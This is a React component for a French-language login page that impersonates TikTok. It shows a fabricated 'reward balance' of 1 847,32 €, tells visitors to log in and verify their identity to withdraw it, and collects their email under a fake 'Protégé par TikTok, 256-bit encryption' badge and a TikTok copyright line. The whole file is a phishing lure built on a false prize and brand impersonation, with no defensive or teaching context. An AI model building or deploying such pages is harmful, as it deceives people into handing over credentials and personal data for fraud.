import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Gift, Lock } from "lucide-react";
import TikTokHeader from "./TikTokHeader";

interface LoginScreenProps {
  onLogin: (email: string) => void;
}

const LoginScreen = ({ onLogin }: LoginScreenProps) => {
  const [email, setEmail] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) onLogin(email.trim());
  };

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader />

      <div className="flex-1 flex flex-col px-6 pt-10">
        <h1 className="text-2xl font-semibold text-center mb-2">Bienvenue</h1>
        <p className="text-sm text-muted-foreground text-center mb-8">Connectez-vous pour accéder à votre portefeuille</p>

        {/* Prize card */}
        <div className="rounded-2xl bg-secondary border border-border/60 p-6 mb-10 text-center shadow-sm">
          <div className="flex items-center justify-center gap-2 mb-3">
            <Gift className="w-5 h-5 text-success" />
            <span className="text-sm font-semibold text-muted-foreground">Votre solde de récompense</span>
          </div>
          <p className="text-[42px] font-bold tracking-tighter leading-none">1 847,32 €</p>
          <p className="text-xs text-muted-foreground mt-3">Connectez-vous et vérifiez votre identité pour retirer</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label className="text-sm font-semibold mb-2 block">E-mail</label>
            <div className="relative">
              <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <Input
                type="email"
                placeholder="Adresse e-mail"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-12 rounded-full bg-secondary border-0 pl-11 pr-5"
                required
              />
            </div>
          </div>

          <Button
            type="submit"
            className="w-full h-14 rounded-full text-base font-semibold"
          >
            Se connecter
          </Button>

          <p className="text-[10px] text-muted-foreground/60 text-center mt-3">
            <Lock className="w-3 h-3 inline mr-1 -mt-px" />
            Protégé par TikTok · Chiffrement 256 bits
          </p>
        </form>
      </div>

      <footer className="py-6 text-center">
        <span className="text-xs text-muted-foreground">© 2025 TikTok · Tous droits réservés</span>
      </footer>
    </div>
  );
};

export default LoginScreen;
